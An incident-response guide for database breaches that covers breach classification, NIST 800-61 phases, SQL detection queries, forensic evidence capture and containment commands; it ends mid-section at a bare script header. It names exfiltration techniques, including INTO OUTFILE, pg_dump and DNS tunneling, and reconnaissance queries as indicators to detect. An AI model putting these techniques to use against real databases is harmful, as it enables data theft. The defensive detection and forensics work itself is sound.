# Incident Response for Data Breaches and Database Security Incidents

## Table of Contents

1. [Data Breach Incident Classification](#1-data-breach-incident-classification)
2. [NIST 800-61 Applied to Data Incidents](#2-nist-800-61-applied-to-data-incidents)
3. [Detection of Data Breaches](#3-detection-of-data-breaches)
4. [Database Forensics](#4-database-forensics)
5. [Containment Strategies](#5-containment-strategies)
6. [Regulatory Notification Requirements](#6-regulatory-notification-requirements)
7. [Communication and Stakeholder Management](#7-communication-and-stakeholder-management)
8. [Recovery and Remediation](#8-recovery-and-remediation)
9. [Post-Incident Analysis](#9-post-incident-analysis)
10. [Lab Exercises](#10-lab-exercises)

---

## 1. Data Breach Incident Classification

### 1.1 Breach Types

A data breach is an incident resulting in unauthorized access to, disclosure of, or loss of personally identifiable information (PII), protected health information (PHI), intellectual property, or other sensitive data. The following taxonomy provides a working classification for IR teams.

#### Unauthorized Access

External actors gain access to database systems through compromised credentials, vulnerability exploitation, or social engineering. This category includes:

- **Credential stuffing** — Automated login attempts using credentials from prior breaches applied against database admin panels, phpMyAdmin, pgAdmin, or direct TCP connections (port 3306, 5432, 1433).
- **Privilege escalation** — Attacker gains low-privilege access (e.g., application service account) then escalates to DBA or superuser via SQL injection into dynamic privilege grants, exploiting `GRANT` misconfigurations, or abusing stored procedures running as `SECURITY DEFINER`.
- **Authentication bypass** — Exploiting default credentials, trust relationships (`pg_hba.conf` trust entries), or zero-day authentication vulnerabilities (e.g., CVE-2012-2122 in MySQL).

#### Data Exfiltration

Deliberate extraction of data from the environment:

- **Bulk extraction** — `SELECT *` into outfile, `pg_dump`, `mysqldump`, `bcp` (SQL Server), or `mongoexport` executed by an attacker or compromised process.
- **Slow exfiltration** — Drip-feed queries extracting small batches over days/weeks to avoid triggering volume-based alerts. Common pattern: `SELECT ... LIMIT 100 OFFSET n` iterated across sessions.
- **Side-channel exfiltration** — DNS tunneling of query results, encoding data into HTTP headers via application layer, using error messages to leak data blind-SQLi style.
- **Application-layer exfil** — Manipulating legitimate API endpoints to return more data than intended (IDOR, broken object-level authorization).

#### Ransomware Targeting Databases

- **Encryption-based** — Attacker gains DBA access, encrypts tablespaces or data files, drops original tables, leaves ransom note (seen in MongoDB "meow" attacks, MySQL ransom campaigns).
- **Deletion-based** — Attacker drops databases, claims to have a backup, demands payment for restoration.
- **Double extortion** — Data exfiltrated first, then encrypted/deleted. Victim faces both operational disruption and threatened publication.
- **Backup destruction** — Attacker targets backup infrastructure (deleting WAL archives, corrupting pg_basebackup outputs, destroying S3 buckets with versioning disabled).

#### Insider Threat

- **Malicious insider** — Employee or contractor with legitimate access deliberately exfiltrates data for financial gain, competitive intelligence, or revenge. Often uses existing tooling (BI tools, direct SQL access).
- **Compromised insider** — Legitimate credentials stolen via phishing, malware, or session hijacking. The "insider" is actually an external actor using insider access.
- **Negligent insider** — Unintentional data exposure through misconfiguration, sending data to wrong recipient, or using unsecured channels.

#### Accidental Exposure

- **Misconfigured storage** — S3 buckets with public ACLs containing database dumps, Elasticsearch clusters without authentication, Redis instances bound to 0.0.0.0 with no AUTH.
- **Backup exposure** — Database backups stored in publicly accessible locations, left on decommissioned servers, or sent over unencrypted channels.
- **Development environment leaks** — Production data copied to dev/staging without anonymization, exposed through development servers with weaker controls.
- **Logging exposure** — Sensitive data written to application logs, shipped to centralized logging without redaction, accessible to operations staff.

### 1.2 Severity Tiers

Severity classification drives response urgency, resource allocation, and escalation paths.

| Tier | Data Sensitivity | Volume | Business Impact | Response SLA |
|------|-----------------|--------|-----------------|--------------|
| **Critical (P1)** | PII with financial data, PHI, credentials, payment cards | >100K records or any volume of Tier 1 data | Regulatory notification mandatory, existential business risk | Immediate (15 min to IR team activation) |
| **High (P2)** | PII (names, emails, addresses), trade secrets, internal credentials | 1K–100K records | Likely regulatory notification, significant reputational risk | 1 hour to IR team activation |
| **Medium (P3)** | Internal business data, non-sensitive user data (preferences, settings) | <1K records or bulk internal data | Potential regulatory inquiry, limited public impact | 4 hours to IR team activation |
| **Low (P4)** | Public data, non-personal technical data, anonymized datasets | Any volume | No regulatory obligation, minimal business impact | Next business day |

#### Data Classification Matrix

```
CRITICAL (Tier 1):
├── Payment card numbers (PAN, CVV, magnetic stripe)
├── Bank account numbers + routing
├── Social Security Numbers / National IDs
├── Protected Health Information (PHI)
├── Plaintext passwords / password hashes with salt
├── Biometric templates
├── Cryptographic private keys
└── Government-classified data

HIGH (Tier 2):
├── Full name + email + address (combined PII)
├── Date of birth
├── Geolocation history
├── Private communications
├── Trade secrets / source code
├── Employee records
└── Authentication tokens / API keys

MEDIUM (Tier 3):
├── Business email addresses
├── Internal documentation
├── Aggregated analytics
├── Non-sensitive configuration
└── Internal project data

LOW (Tier 4):
├── Public directory information
├── Published content
├── Non-personal technical logs
└── Anonymized/pseudonymized data
```

### 1.3 Data Breach vs Security Incident

Not every security incident is a data breach. This distinction matters for regulatory obligations and response procedures.

**Security Incident**: Any event that compromises the confidentiality, integrity, or availability of information systems. Includes:
- Port scans and vulnerability scanning
- Brute force attempts that did not succeed
- Malware detected and contained before data access
- DDoS attacks affecting availability but not confidentiality
- Unauthorized system access without data access evidence

**Data Breach**: A security incident that specifically results in confirmed or suspected unauthorized access to, or disclosure of, protected data. The key differentiator is **data compromise** — evidence that data was accessed, viewed, copied, or transmitted to an unauthorized party.

**Gray Zone**: Incidents where data access is possible but unconfirmed:
- Attacker had access to a system containing sensitive data but no direct evidence of data access
- Web shell on application server with database connectivity
- Compromised account with data access permissions but no query logs

GDPR Article 4(12) treats "accidental or unlawful destruction, loss, alteration, unauthorized disclosure of, or access to personal data" as a breach. The standard is broad — mere *access* to personal data by an unauthorized party constitutes a breach, regardless of whether data was copied.

### 1.4 Regulatory Classification: Notifiable vs Non-Notifiable

**Notifiable breaches** (mandatory reporting to authorities and/or affected individuals):
- Any breach involving personal data that is "likely to result in a risk to the rights and freedoms of natural persons" (GDPR Art. 33)
- Any breach of unsecured PHI affecting 500+ individuals (HIPAA)
- Any compromise of payment card data (PCI-DSS)
- Breaches meeting state notification thresholds (varies by jurisdiction)

**Non-notifiable events** (internal handling, no external reporting required):
- Encrypted data breach where encryption keys are not compromised (HIPAA Safe Harbor)
- Data accessed by authorized personnel in an unauthorized manner (depends on jurisdiction)
- Breach of non-personal, non-regulated data
- Successfully contained attacks with no data access evidence

---

## 2. NIST 800-61 Applied to Data Incidents

NIST Special Publication 800-61 Rev. 2 provides the canonical Incident Response Life Cycle. We apply each phase specifically to database and data breach scenarios.

### 2.1 Preparation

#### IR Team Structure for Data Incidents

```
Incident Commander (IC)
├── Technical Lead (Database/Infrastructure)
│   ├── DBA (production database systems)
│   ├── Network Engineer (traffic analysis, containment)
│   └── Security Engineer (malware analysis, forensics)
├── Legal/Compliance Lead
│   ├── Privacy Officer (GDPR/HIPAA assessments)
│   └── External Counsel (regulatory communication)
├── Communications Lead
│   ├── Internal Communications
│   └── External Communications / PR
└── Business Liaison
    ├── Affected Business Unit Representative
    └── Customer Success (individual notifications)
```

#### Essential Tooling

**Database Forensics:**
- `pgAudit` (PostgreSQL audit logging extension)
- MySQL Enterprise Audit / MariaDB Audit Plugin
- SQL Server Extended Events + Audit
- MongoDB `auditLog` configuration
- `pt-query-digest` (Percona Toolkit) for query analysis

**Network Forensics:**
- Full packet capture at database network segment (tcpdump, Wireshark, Moloch/Arkime)
- NetFlow/sFlow data for connection volume analysis
- TLS interception capability (for non-production investigation)

**Endpoint/Host:**
- Database server memory dump tools (LiME for Linux, WinPmem for Windows)
- File integrity monitoring (AIDE, OSSEC, Tripwire)
- Process monitoring (sysdig, auditd, osquery)

**Log Aggregation:**
- SIEM (Splunk, Elastic Security, QRadar, Sentinel)
- Centralized database log shipping (separate from production log rotation)
- Immutable log storage (WORM, append-only S3 buckets)

#### Playbook Library

Maintain pre-written playbooks for:
1. SQL injection leading to data exfiltration
2. Compromised database administrator credentials
3. Ransomware targeting database servers
4. Exposed backup/dump in public storage
5. Insider threat — bulk data download
6. Third-party vendor database compromise
7. Application-layer data exposure (IDOR/BOLA)
8. Cloud database misconfiguration (public RDS, exposed Cosmos DB)

Each playbook specifies: detection indicators, immediate containment steps, evidence preservation procedures, escalation criteria, regulatory implications, and recovery procedures.

### 2.2 Detection and Analysis

#### Indicators of Data Compromise

**High-Confidence Indicators:**
- Database dump files appearing on attacker infrastructure (dark web, paste sites)
- `pg_dump`, `mysqldump`, `bcp` execution by non-DBA accounts
- Large result set queries (millions of rows) from application service accounts that normally return paginated results
- Outbound data transfer spikes from database server network segment
- New database users created outside of change management
- `INTO OUTFILE`, `INTO DUMPFILE` (MySQL), `COPY TO` (PostgreSQL) statements in query logs

**Medium-Confidence Indicators:**
- Authentication failures followed by successful authentication from same source
- Queries against information_schema, pg_catalog, sys.tables (reconnaissance)
- Off-hours database activity exceeding baseline
- Application error rates correlating with SQL injection probing
- Unusual `UNION SELECT` patterns in web application logs
- Privilege escalation commands (`GRANT`, `ALTER USER`, `CREATE ROLE`)

**Low-Confidence (Contextual) Indicators:**
- Increased DNS queries from database server (potential DNS exfiltration)
- New network connections from database server to external IPs
- Unusual process execution on database server host
- Changes to database configuration files outside maintenance windows

#### Analysis Framework

```
1. Scope determination
   └── Which databases/tables/columns affected?
   └── What time window is implicated?
   └── Which accounts were involved?

2. Data sensitivity assessment
   └── Map affected tables to data classification
   └── Determine record count
   └── Identify affected individuals (for notification)

3. Attack vector identification
   └── How did attacker gain access?
   └── What vulnerability or weakness was exploited?
   └── Is the vector still open?

4. Lateral movement assessment
   └── Did attacker move from database to other systems?
   └── Are database credentials reused elsewhere?
   └── Is the database server a pivot point?
```

### 2.3 Containment

Containment for data incidents balances stopping ongoing exfiltration against preserving forensic evidence and maintaining business operations.

#### Immediate Containment (First 30 Minutes)

```sql
-- PostgreSQL: Revoke compromised account
ALTER USER compromised_user NOLOGIN;
SELECT pg_terminate_backend(pid) 
FROM pg_stat_activity 
WHERE usename = 'compromised_user';

-- Block attacker IP at firewall level
-- (execute on network device or host firewall)
-- iptables -A INPUT -s ATTACKER_IP -j DROP

-- MySQL: Lock compromised account
ALTER USER 'compromised_user'@'%' ACCOUNT LOCK;
-- Kill active sessions
SELECT GROUP_CONCAT(CONCAT('KILL ', id, ';') SEPARATOR ' ') 
FROM information_schema.processlist 
WHERE user = 'compromised_user';
```

#### Short-Term Containment (First 4 Hours)

- Reduce database to read-only mode if exfiltration is ongoing and data integrity is not the attack vector
- Implement connection rate limiting
- Enable enhanced audit logging (capture all queries, not just DDL)
- Deploy network-level monitoring on database segment
- Rotate application credentials connecting to affected database

#### Long-Term Containment (While Investigation Continues)

- Implement IP allowlisting for database access
- Deploy database activity monitoring (DAM) solution
- Add row-level security policies to sensitive tables
- Implement query result size limits at proxy level
- Enable TLS mutual authentication for database connections

### 2.4 Eradication

- Remove attacker persistence mechanisms (backdoor accounts, stored procedures with embedded shells, scheduled jobs, triggers with exfiltration logic)
- Patch exploited vulnerabilities (SQL injection in application code, unpatched database CVEs, misconfigured authentication)
- Remove planted malware on database server host
- Clean compromised application code that enabled the breach
- Revoke and regenerate all potentially compromised credentials
- Remove unauthorized database objects (tables, views, functions created by attacker)

### 2.5 Recovery

- Restore data from verified clean backup (pre-compromise point-in-time)
- Verify data integrity through checksums, row counts, and reconciliation with known-good sources
- Rebuild database server from hardened image if host compromise is suspected
- Gradually restore connectivity (internal first, then external)
- Implement enhanced monitoring before declaring recovery complete
- Validate application functionality against restored database

### 2.6 Lessons Learned

Conduct within 2 weeks of incident closure:
- Document complete timeline with UTC timestamps
- Identify root cause and contributing factors
- Assess effectiveness of detection (time to detect), containment (time to contain), and recovery (time to recover)
- Generate recommendations with owners and deadlines
- Update IR playbooks based on findings
- Brief executive stakeholders on risk posture changes

---

## 3. Detection of Data Breaches

### 3.1 Database Anomaly Detection

#### Unusual Query Patterns

Establish baselines for normal database activity, then alert on deviations:

**Query Volume Anomalies:**
```sql
-- PostgreSQL: Track query counts per user per hour
-- Compare against baseline in monitoring system
SELECT usename, 
       date_trunc('hour', query_start) as hour,
       count(*) as query_count
FROM pg_stat_activity
WHERE state = 'active'
GROUP BY usename, date_trunc('hour', query_start);
```

**Result Set Size Monitoring:**
- Alert when a single query returns >10x the normal row count for that query pattern
- Monitor `rows_sent` in MySQL's slow query log
- Track `pg_stat_statements.rows` for baseline establishment

**Schema Reconnaissance Detection:**
```sql
-- Alert on information_schema enumeration
-- These patterns indicate an attacker mapping the database
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name = 'users';
SELECT * FROM pg_catalog.pg_tables;
SHOW TABLES; DESCRIBE users;  -- MySQL reconnaissance
```

#### Off-Hours Access Detection

```sql
-- PostgreSQL: Identify connections outside business hours
SELECT usename, client_addr, backend_start, query
FROM pg_stat_activity
WHERE EXTRACT(HOUR FROM backend_start) NOT BETWEEN 7 AND 19
  AND usename NOT IN ('replication_user', 'monitoring_user', 'backup_user')
  AND backend_type = 'client backend';
```

#### Bulk SELECT Detection

Monitor for queries that return disproportionate data volumes:

```sql
-- pg_stat_statements analysis for bulk reads
SELECT userid, queryid, 
       calls, rows, 
       rows/NULLIF(calls,0) as avg_rows_per_call,
       query
FROM pg_stat_statements
WHERE rows/NULLIF(calls,0) > 10000  -- Threshold: adjust per environment
ORDER BY rows DESC
LIMIT 50;
```

### 3.2 DLP Alerts

Database-specific Data Loss Prevention rules:

- **Pattern matching on egress** — Monitor network traffic leaving database segment for patterns matching credit card numbers (Luhn algorithm), SSN format, email addresses in bulk
- **Endpoint DLP** — Alert when database client tools (psql, mysql, sqlcmd, mongosh) are used on endpoints not in the DBA allowlist
- **API-layer DLP** — Monitor API responses for excessive PII density (response contains >50 email addresses, >10 SSNs, etc.)
- **Email DLP** — Scan outbound email for database exports (.sql, .csv files with PII patterns)

### 3.3 SIEM Correlation Rules for Data Exfiltration

```yaml
# Example Splunk correlation search
# Detects: Database query spike followed by outbound data transfer

[Database Exfiltration Correlation]
search: index=database sourcetype=pg_audit action=SELECT rows_affected>10000
  | join client_ip [search index=firewall action=allow direction=outbound bytes_out>10000000]
  | where _time_firewall - _time_database < 300
alert_threshold: 1
severity: critical

# Detects: New database user creation followed by bulk access

[Privilege Escalation + Exfil]
search: index=database sourcetype=pg_audit 
  (action=CREATE_ROLE OR action=GRANT) 
  | append [search index=database sourcetype=pg_audit action=SELECT rows_affected>1000]
  | transaction session_id maxspan=1h
  | where eventcount > 2
```

**Key correlation patterns:**

1. Failed auth → Successful auth → Schema enumeration → Bulk SELECT
2. New user creation → Privilege grant → Off-hours bulk query
3. Application error spike (SQLi probing) → New query patterns → Outbound transfer
4. VPN connection from unusual geo → Database connection → Large result sets

### 3.4 Dark Web Monitoring

- Subscribe to services monitoring paste sites, underground forums, and marketplaces for organization's data
- Monitor for your organization's email domain patterns in credential dumps
- Search for database schemas matching your environment (table names, column names are unique identifiers)
- Set alerts for your organization name in ransomware group leak sites
- Monitor for sale of access to your infrastructure (Initial Access Brokers)

### 3.5 Canary Tokens in Databases

Canary tokens are tripwires — fake data that, when accessed, triggers an alert indicating unauthorized database access.

#### Implementation Approaches

**Canary Rows:**
```sql
-- Insert fake records that no legitimate query should ever retrieve
INSERT INTO customers (id, email, name, ssn, created_at)
VALUES (
  uuid_generate_v4(),
  'jane.canary.7x9k@internal-trap.example.com',
  'Jane Canary',
  '078-05-1120',  -- Known invalid SSN (078-05-xxxx range is invalid)
  '2020-01-01'
);

-- Create trigger that fires when canary row is accessed
CREATE OR REPLACE FUNCTION canary_alert() RETURNS trigger AS $$
BEGIN
  -- Fire webhook or write to dedicated alert table
  PERFORM pg_notify('canary_triggered', 
    json_build_object(
      'table', TG_TABLE_NAME,
      'operation', TG_OP,
      'timestamp', now(),
      'session_user', session_user,
      'client_addr', inet_client_addr()
    )::text
  );
  RETURN OLD;
END;
$$ LANGUAGE plpgsql;
```

**Canary Columns:**
```sql
-- Add a column that no application code references
ALTER TABLE customers ADD COLUMN _internal_ref VARCHAR(64) DEFAULT 'CANARY_TOKEN_v2';

-- Any query explicitly selecting this column indicates reconnaissance
-- Monitor via audit logging for queries referencing _internal_ref
```

**Honey Tables:**
```sql
-- Create tables that look valuable but contain fake data
CREATE TABLE credit_cards_archive (
  id SERIAL PRIMARY KEY,
  card_number VARCHAR(19),  -- Contains realistic-looking but invalid numbers
  expiry_date DATE,
  cvv VARCHAR(4),
  cardholder_name VARCHAR(100),
  billing_address TEXT
);

-- Populate with realistic fake data
-- Any SELECT against this table is suspicious
```

**Canary DNS Tokens:**
```sql
-- Insert fake records with trackable domains
INSERT INTO api_keys (service, key_value, endpoint)
VALUES ('payment_gateway', 'sk_live_FAKE_CanaryToken_9x8k2m', 
        'https://7h4x9k.canarytokens.com/api/v1');
-- If this endpoint is ever hit, you know the data was exfiltrated and used
```

### 3.6 Database Activity Monitoring (DAM)

Deploy dedicated monitoring that operates independently of the database engine:

- **Network-based DAM** — Passive tap on database network segment, parses wire protocol (libpq for PostgreSQL, MySQL protocol, TDS for SQL Server)
- **Agent-based DAM** — Agent on database host intercepts queries at OS level (ptrace, eBPF)
- **Log-based DAM** — Parses native audit logs (pgAudit, MySQL Audit Log, SQL Server Audit)

Key capabilities required:
- Real-time alerting on policy violations
- Sensitive data discovery and classification
- User behavior analytics (baseline learning)
- Session replay for forensic investigation
- Privileged user monitoring (DBA oversight)

---

## 4. Database Forensics

### 4.1 Evidence Preservation

The first rule of forensics: **do not alter the evidence**. Database forensics is challenging because databases are inherently mutable — transactions continuously modify data.

#### PostgreSQL Evidence Preservation

```bash
# 1. Capture current WAL position (before any containment action)
psql -c "SELECT pg_current_wal_lsn(), current_timestamp;"

# 2. Create a forensic snapshot using pg_basebackup
# This creates a consistent point-in-time copy
pg_basebackup -D /forensics/pg_snapshot_$(date +%Y%m%d_%H%M%S) \
  -Ft -z -Xs -P \
  --label="forensic_capture_incident_$(date +%Y%m%d)"

# 3. Preserve WAL files for point-in-time recovery
# Copy all WAL files from archive and pg_wal
cp -a /var/lib/postgresql/data/pg_wal/* /forensics/wal_archive/
cp -a /mnt/wal_archive/* /forensics/wal_archive/

# 4. Capture pg_stat_activity (active sessions at time of discovery)
psql -c "COPY (SELECT * FROM pg_stat_activity) TO '/forensics/stat_activity_$(date +%Y%m%d_%H%M%S).csv' WITH CSV HEADER;"

# 5. Capture pg_stat_statements (query history with statistics)
psql -c "COPY (SELECT * FROM pg_stat_statements) TO '/forensics/stat_statements_$(date +%Y%m%d_%H%M%S).csv' WITH CSV HEADER;"

# 6. Preserve pgAudit logs
cp -a /var/log/postgresql/audit* /forensics/audit_logs/

# 7. Capture connection info
psql -c "COPY (SELECT * FROM pg_stat_ssl) TO '/forensics/ssl_connections.csv' WITH CSV HEADER;"

# 8. Hash all forensic artifacts
find /forensics -type f -exec sha256sum {} \; > /forensics/evidence_hashes.txt
```

#### MySQL/MariaDB Evidence Preservation

```bash
# 1. Capture binary log position
mysql -e "SHOW MASTER STATUS\G" > /forensics/binlog_position.txt

# 2. Copy binary logs (these contain all write operations)
cp -a /var/lib/mysql/binlog.* /forensics/binlogs/

# 3. Extract binary log to SQL for analysis
mysqlbinlog --base64-output=DECODE-ROWS -v \
  --start-datetime="2024-01-15 00:00:00" \
  --stop-datetime="2024-01-16 00:00:00" \
  /forensics/binlogs/binlog.000042 > /forensics/binlog_decoded.sql

# 4. Capture process list and InnoDB status
mysql -e "SHOW FULL PROCESSLIST\G" > /forensics/processlist.txt
mysql -e "SHOW ENGINE INNODB STATUS\G" > /forensics/innodb_status.txt

# 5. Capture general query log (if enabled)
cp /var/log/mysql/general.log /forensics/general_query_log.txt

# 6. Logical dump for record comparison
mysqldump --single-transaction --routines --triggers --events \
  --all-databases > /forensics/full_dump_$(date +%Y%m%d_%H%M%S).sql
```

#### SQL Server Evidence Preservation

```sql
-- Capture transaction log backup (contains all operations)
BACKUP LOG [DatabaseName] 
TO DISK = N'/forensics/tail_log_backup.trn'
WITH NO_TRUNCATE, NORECOVERY;

-- Query transaction log for specific operations
SELECT [Current LSN], [Transaction ID], [Operation], 
       [Transaction Name], [Transaction SID], [Begin Time],
       [SPID], [Description]
FROM fn_dblog(NULL, NULL)
WHERE [Operation] IN ('LOP_INSERT_ROWS', 'LOP_DELETE_ROWS', 'LOP_MODIFY_ROW')
  AND [Begin Time] > '2024-01-15 00:00:00';

-- Extended Events session for ongoing capture
CREATE EVENT SESSION [ForensicCapture] ON SERVER
ADD EVENT sqlserver.sql_statement_completed(
    ACTION(sqlserver.session_id, sqlserver.username, 
           sqlserver.client_hostname, sqlserver.database_name)
    WHERE sqlserver.database_name = 'TargetDB')
ADD TARGET package0.event_file(SET filename=N'/forensics/forensic_capture.xel');
```

### 4.2 Timeline Reconstruction

Building a complete timeline of attacker actions is the core forensic objective.

#### Source Correlation

Combine multiple log sources into a unified timeline:

```
Timeline Sources:
├── Database audit logs (pgAudit, MySQL audit, SQL Server audit)
├── Binary/transaction logs (binlog, WAL, transaction log)
├── Operating system logs (auth.log, syslog, Windows Security)
├── Network logs (firewall, NetFlow, packet captures)
├── Application logs (web server, API gateway, error logs)
├── Authentication system logs (LDAP, Active Directory, SSO)
├── Cloud provider logs (CloudTrail, Azure Activity Log, GCP Audit)
└── Endpoint detection logs (EDR telemetry)
```

#### Timeline Format

```
| UTC Timestamp          | Source      | Actor          | Action                    | Evidence                    |
|------------------------|-------------|----------------|---------------------------|-----------------------------|
| 2024-01-15T02:14:33Z   | Web WAF     | 192.168.1.50   | SQLi probe detected       | log_id: waf-8843            |
| 2024-01-15T02:14:35Z   | App log     | 192.168.1.50   | 500 error on /api/users   | error_log line 44281        |
| 2024-01-15T02:15:01Z   | Web WAF     | 192.168.1.50   | SQLi payload succeeded    | UNION SELECT in response    |
| 2024-01-15T02:15:03Z   | pgAudit     | app_user       | SELECT on users table     | audit_id: 9920133           |
| 2024-01-15T02:15:08Z   | pgAudit     | app_user       | SELECT on information_schema | audit_id: 9920134        |
| 2024-01-15T02:16:44Z   | pgAudit     | app_user       | SELECT * FROM credit_cards | audit_id: 9920201         |
| 2024-01-15T02:16:45Z   | NetFlow     | DB server      | 4.2MB outbound to CDN IP  | flow_id: nf-44219           |
```

### 4.3 Identifying Accessed/Modified/Exfiltrated Records

#### Determining What Was Accessed

```sql
-- PostgreSQL with pgAudit: Find all SELECT queries during attack window
-- Requires pgAudit configured with pgaudit.log = 'read'
-- Parse log files for entries during attack window:
-- Example log entry:
-- AUDIT: SESSION,1,1,READ,SELECT,,,SELECT * FROM customers WHERE state = 'CA',<none>

-- Using pg_stat_statements to identify high-row queries
SELECT query, calls, rows, 
       rows/NULLIF(calls,0) as avg_rows
FROM pg_stat_statements 
WHERE dbid = (SELECT oid FROM pg_database WHERE datname = 'production')
  AND userid = (SELECT usesysid FROM pg_user WHERE usename = 'compromised_user')
ORDER BY rows DESC;
```

#### Determining What Was Modified

```sql
-- PostgreSQL: Use WAL inspection (pg_waldump)
-- Requires access to WAL files
-- pg_waldump START_LSN END_LSN -p /path/to/pg_wal | grep "INSERT\|UPDATE\|DELETE"

-- MySQL: Parse binary log for DML during attack window
-- mysqlbinlog --start-datetime="2024-01-15 02:00:00" \
--   --stop-datetime="2024-01-15 04:00:00" binlog.000042 \
--   | grep -E "^(INSERT|UPDATE|DELETE)"

-- SQL Server: Query transaction log
SELECT [Transaction ID], [Begin Time], [End Time],
       [Transaction Name], [Operation], [AllocUnitName],
       SUSER_SNAME([Transaction SID]) as [User]
FROM fn_dblog(NULL, NULL) 
WHERE [Begin Time] >= '2024-01-15 02:00:00'
  AND [Operation] IN ('LOP_INSERT_ROWS', 'LOP_MODIFY_ROW', 'LOP_DELETE_ROWS');
```

#### Estimating Exfiltrated Volume

- Calculate total rows returned in suspicious queries (from audit logs)
- Correlate with network egress volume from database server
- Check connection duration and data transfer rates
- Review application response sizes in web server access logs

### 4.4 Memory Forensics of Database Processes

Database processes hold sensitive data in memory — connection credentials, recent query results, decrypted data, and cached table contents.

```bash
# Linux: Capture memory of PostgreSQL processes
# Identify PostgreSQL backend PIDs
pgrep -f "postgres:" | while read pid; do
  gcore -o /forensics/memory/pg_process_${pid} ${pid}
done

# Or use LiME for full memory dump
insmod /path/to/lime.ko "path=/forensics/memory/full_dump.lime format=lime"

# Search memory dump for patterns (credit cards, SSNs, emails)
strings /forensics/memory/pg_process_12345.12345 | \
  grep -E '[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}' > /forensics/cc_in_memory.txt

# Volatility for structured analysis
vol3 -f /forensics/memory/full_dump.lime linux.pslist
vol3 -f /forensics/memory/full_dump.lime linux.bash
```

### 4.5 Deleted Data Recovery

Attackers may attempt to cover tracks by deleting data or log entries.

```sql
-- PostgreSQL: VACUUM has not run yet — data is still in pages
-- Use pageinspect extension to examine heap pages
CREATE EXTENSION pageinspect;

-- Check for dead tuples (recently deleted/updated rows)
SELECT schemaname, relname, n_dead_tup, last_vacuum, last_autovacuum
FROM pg_stat_user_tables
WHERE n_dead_tup > 0
ORDER BY n_dead_tup DESC;

-- MySQL InnoDB: Deleted rows remain in pages until purge
-- Tools like undrop-for-innodb can recover from .ibd files
-- Percona's innodb_space tool can inspect page-level data
```

**File system level recovery:**
```bash
# If database files were deleted, use file carving
# The database process may still hold file descriptors open
ls -la /proc/$(pgrep -f "postgres")/fd/ | grep deleted

# Recover deleted file through /proc
cp /proc/PID/fd/FDNUM /forensics/recovered_file

# Use extundelete, photorec, or scalpel for file system recovery
extundelete /dev/sda1 --restore-file var/lib/postgresql/data/base/16384/16385
```

---

## 5. Containment Strategies

### 5.1 Immediate Actions (First 15 Minutes)

The goal: stop active exfiltration while preserving evidence.

#### Credential Rotation

```bash
# PostgreSQL: Rotate all potentially compromised passwords
# Generate new passwords
NEW_PASS=$(openssl rand -base64 32)

# Change password for compromised account
psql -c "ALTER USER app_user WITH PASSWORD '${NEW_PASS}';"

# Force disconnect existing sessions using old credentials
psql -c "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename = 'app_user' AND pid <> pg_backend_pid();"

# Update application configuration with new credentials
# (via secrets manager, not plaintext config files)

# Rotate database-level encryption keys if applicable
# Rotate SSL certificates if private key compromise is suspected
```

#### Network Isolation

```bash
# Isolate database server at network level
# Option 1: Firewall rules (preserves connectivity for forensics)
iptables -I INPUT -s 0/0 -p tcp --dport 5432 -j DROP
iptables -I INPUT -s FORENSICS_WORKSTATION_IP -p tcp --dport 5432 -j ACCEPT
iptables -I INPUT -s APP_SERVER_INTERNAL_IP -p tcp --dport 5432 -j ACCEPT

# Option 2: Security group modification (cloud)
aws ec2 revoke-security-group-ingress --group-id sg-xxx \
  --protocol tcp --port 5432 --cidr 0.0.0.0/0

# Option 3: VLAN isolation (switch-level)
# Move database server port to quarantine VLAN

# Block known attacker IPs across all segments
for IP in $(cat /forensics/attacker_ips.txt); do
  iptables -I INPUT -s $IP -j DROP
  iptables -I OUTPUT -d $IP -j DROP
done
```

#### IP Blocking

- Block confirmed attacker source IPs at perimeter firewall
- Block at WAF/CDN layer if application-layer attack
- Add IPs to threat intelligence block lists
- Consider blocking entire CIDR if multiple IPs from same range

### 5.2 Short-Term Containment (First 4 Hours)

#### Read-Only Mode

```sql
-- PostgreSQL: Set database to read-only
ALTER DATABASE production SET default_transaction_read_only = on;

-- Or at the system level
ALTER SYSTEM SET default_transaction_read_only = on;
SELECT pg_reload_conf();

-- MySQL: Set to read-only
SET GLOBAL read_only = ON;
SET GLOBAL super_read_only = ON;  -- Even prevents SUPER users from writing

-- Note: This stops the attack but also stops business operations
-- Use only when exfiltration is confirmed and ongoing
```

#### Connection Limiting

```sql
-- PostgreSQL: Limit connections to essential only
ALTER USER app_user CONNECTION LIMIT 5;  -- Normal might be 100
ALTER DATABASE production CONNECTION LIMIT 20;

-- pg_hba.conf: Restrict to known application servers only
-- Reload: SELECT pg_reload_conf();
-- hostssl production app_user 10.0.1.0/24 scram-sha-256
-- host   all       all      0.0.0.0/0   reject

-- MySQL: Limit connections
ALTER USER 'app_user'@'%' WITH MAX_CONNECTIONS_PER_HOUR 100;
ALTER USER 'app_user'@'%' WITH MAX_USER_CONNECTIONS 5;
```

#### Enhanced Monitoring Deployment

```sql
-- PostgreSQL: Enable full query logging temporarily
ALTER SYSTEM SET log_statement = 'all';
ALTER SYSTEM SET log_min_duration_statement = 0;
ALTER SYSTEM SET log_connections = on;
ALTER SYSTEM SET log_disconnections = on;
SELECT pg_reload_conf();

-- Enable pgAudit for comprehensive auditing
ALTER SYSTEM SET pgaudit.log = 'all';
ALTER SYSTEM SET pgaudit.log_parameter = on;
SELECT pg_reload_conf();
```

### 5.3 Long-Term Containment (Days to Weeks)

While the investigation continues, implement hardening that allows operations to resume:

- **Network segmentation** — Move database to stricter network segment with explicit allow rules only
- **Privileged access management** — Route all DBA access through a PAM solution with session recording
- **Query filtering** — Deploy a SQL proxy (e.g., PgBouncer with query filtering, ProxySQL with query rules) to block suspicious patterns
- **Data masking** — Apply dynamic data masking for non-essential access
- **Enhanced authentication** — Require MFA for all database administrative access
- **Behavioral baselines** — Deploy UEBA (User and Entity Behavior Analytics) tuned to current access patterns

### 5.4 Evidence-Preserving Containment

Critical principle: **Containment actions must not destroy forensic evidence.**

**DO:**
- Take memory dumps before killing processes
- Capture network state before modifying firewall rules
- Snapshot disk before reimaging
- Preserve running process list, network connections, logged-in users
- Document every containment action with UTC timestamp

**DO NOT:**
- Run `VACUUM FULL` (destroys dead tuples that may contain evidence)
- Drop attacker-created objects before documenting them
- Overwrite database data files
- Clear logs to "reset" the system
- Reboot systems before capturing volatile evidence
- Run antivirus scans that quarantine/delete evidence artifacts

```bash
# Evidence-preserving containment script
#!/bin/bash
